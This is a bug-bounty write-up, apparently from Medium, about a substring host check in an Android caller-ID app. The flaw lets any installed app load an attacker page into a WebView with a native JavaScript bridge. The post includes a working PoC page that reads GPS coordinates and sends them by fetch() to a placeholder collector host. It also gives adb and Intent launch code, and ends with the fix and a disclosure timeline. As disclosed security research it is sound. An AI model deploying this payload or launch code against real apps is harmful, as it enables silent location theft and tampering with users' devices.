# One .contains() Away From a Full JavaScript Bridge Takeover

- **Source URL:** https://medium.com/@husein.ayoub/one-contains-away-from-a-full-javascript-bridge-takeover-e0c05eb066f8?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@husein.ayoub
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14762)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
### How a lazy host check in an Android WebView let any app on the device steal GPS coordinates, wipe local data, no permissions, no user interaction.

If you’ve done any Android bug hunting, you already know the two ingredients that make this class of bug so reliable:

1. An **exported activity** that anyone on the device can launch.
2. A **WebView with a JavaScript bridge** (@JavascriptInterface) sitting behind a validation check that *looks* safe.

The magic, or the disaster, depending on which side you’re on, happens when the “validation” between those two things turns out to be a substring match. This is a write-up of exactly that: a deep-link host check that used String.contains() where it should have used real domain validation, and what that one decision unlocked.

### The target

The app in question is a popular **caller-ID and local business directory** app, the kind that identifies unknown callers, blocks telemarketers, and works offline against a locally cached lookup database. That feature set matters, because it means the app holds two things an attacker would love: **your location** and a **privileged native bridge** wired up to device-level functionality (call handling, offline data, backend selection).

The entry point was a single exported activity, I’ll call it StartActivity — which had **no intent-filter declared in the manifest but was still exported**. That's the first smell: an activity reachable by any other app on the device, handling Intent data, with no obvious reason to be public.

### My workflow: decompile, then let the model do the boring part

I run a fairly automation-heavy triage pipeline for APKs. After pulling the APK and decompiling it (jadx for the readable Java, apktool for the manifest and resources), I feed the decompiled output through an LLM-assisted review pass to flag suspicious sinks before I ever read a line myself.

For this engagement, the review pass ran on **Claude Opus 4.6 via Amazon Bedrock**. The value isn’t that the model “finds the bug”, it’s that it burns through hundreds of obfuscated classes and surfaces the handful worth human attention: exported components, @JavascriptInterface annotations, loadUrl calls, and any string comparison that touches a URL or host. In this case it flagged the exact combination that turned into this report: an exported activity feeding a WebView, gated by a host check that wasn't an equality or suffix check.

That flag is where the human work started.

### Attack surface #1: the JavaScript bridge

The app registered a JS interface named Android onto its main WebView. Decompiled, the bridge class (obfuscated to something like a1.b) exposed **17 methods** annotated with @JavascriptInterface. Any JavaScript running in that WebView can call all of them directly. The interesting ones:

On its own, a JS bridge is fine*, if* the WebView only ever loads content you control. The entire security model rests on that assumption. Which brings us to the second half of the bug.

### Attack surface #2: the host check that wasn’t

Here’s the (reconstructed, de-obfuscated) validation from StartActivity.onCreate():

Uri data = getIntent().getData();

String host;

if (data != null

&& (host = data.getHost()) != null

&& h.a(host, ".trusted.app") // \<-- the problem

&& "https".equals(data.getScheme())) {

// attacker-controlled URL gets loaded into the bridge WebView

state.targetUrl = String.valueOf(getIntent().getData());

}

The helper h.a(a, b) decompiled to a.indexOf(b) >= 0 — in other words, **host.contains(".trusted.app")**.

The app doesn’t check that the host *is* trusted.app or *ends with* .trusted.app. It checks whether the string .trusted.app appears **anywhere** inside the host.

So I register:

pwned.trusted.app.attacker.com

The host pwned.trusted.app.attacker.com contains the substring .trusted.app. Validation passes. Scheme is https. The app happily loads https://pwned.trusted.app.attacker.com/exploit , a domain I fully control**, into the WebView that has the native bridge attached**.

### Building the PoC

The exploit page is just a static HTML file hosted on the attacker domain. When the WebView loads it, the inline script probes for the bridge and exfiltrates whatever it can reach:

\<!DOCTYPE html>

\<html>

\<head>\<title>PoC\</title>\</head>

\<body>

\<pre id="out">\</pre>

\<script>

const out = document.getElementById('out');

const webhook = 'https://your-collector.example/collect';

function log(msg) {

out.textContent += msg + '\n';

fetch(webhook + '?d=' + encodeURIComponent(msg)).catch(() => {});

}

try {

if (typeof Android === 'undefined') {

log('\[FAIL\] bridge not present');

} else {

log('\[OK\] bridge reachable');

log('\[LEAK\] version: ' + Android.getAppVersion());

log('\[LEAK\] loc perm: ' + Android.queryLocationPermission());

log('\[LEAK\] coords: ' + (Android.getCoordinates() || 'null'));

}

} catch (e) {

log('\[ERR\] ' + e.message);

}

\</script>

\</body>

\</html>

### Triggering it

One catch worth calling out, because it’ll waste your time otherwise: **the app must not already be foregrounded.** If StartActivity is alive, Android brings the existing instance forward without re-running onCreate(), so your URL is never loaded. Force-stop first.

adb shell am force-stop com.vendor.directoryapp

adb shell am start \

-n com.vendor.directoryapp/.StartActivity \

-d "https://pwned.trusted.app.attacker.com/exploit"

Within a second, the collector receives:

?d=\[OK\] bridge reachable

?d=\[LEAK\] version: \<redacted>

?d=\[LEAK\] loc perm: granted

?d=\[LEAK\] coords: {"latitude":\<redacted>,"longitude":\<redacted>,"timestamp":\<redacted>}

### From ADB to a real-world attack

ADB is just for the demo. In the wild, this needs no debugging access and no permissions at all, any installed app can launch an exported activity:

Intent i = new Intent();

i.setComponent(new ComponentName(

"com.vendor.directoryapp",

"com.vendor.directoryapp.StartActivity"));

i.setData(Uri.parse("https://pwned.trusted.app.attacker.com/exploit"));

startActivity(i);

### Impact

Once arbitrary JS is running against the bridge, you inherit all 17 methods. Grouped by CIA:

**Confidentiality (high)**

- Silent GPS coordinate theft via getCoordinates().
- Location-permission state disclosure and app fingerprinting.

**Integrity (medium)**

- enableCallerId(false) silently disables the app's core protective feature.
- removeOfflineData() Wipes the offline lookup cache.
- showPopupSelectServer() repoints the app to a **staging/beta backend.**
- muteTelemarketing(true) tampers with Do-Not-Disturb behavior.

**Availability (low)**

- forceOfflineDataDownload() Forces a heavy background sync.

### The fix

The remediation is small:

// vulnerable

host.contains(".trusted.app");

// fixed

host.equals("trusted.app") || host.endsWith(".trusted.app");

Defense in depth on top of that:

- Set the activity to exported="false" if it has no legitimate reason to be launched by other apps (this one had no intent-filter at all).
- Re-validate the origin *inside* the sensitive @JavascriptInterface methods, so the bridge isn't a single point of failure.
- Prefer an allowlist that’s actually enforced on the initial loadUrl, not just on in-page navigation.

**Disclosure timeline:**

23/Jul/26 -> Reported

28/Jul/26 -> Triaged

13/Aug/26 -> Fixed & Bounty Awarded
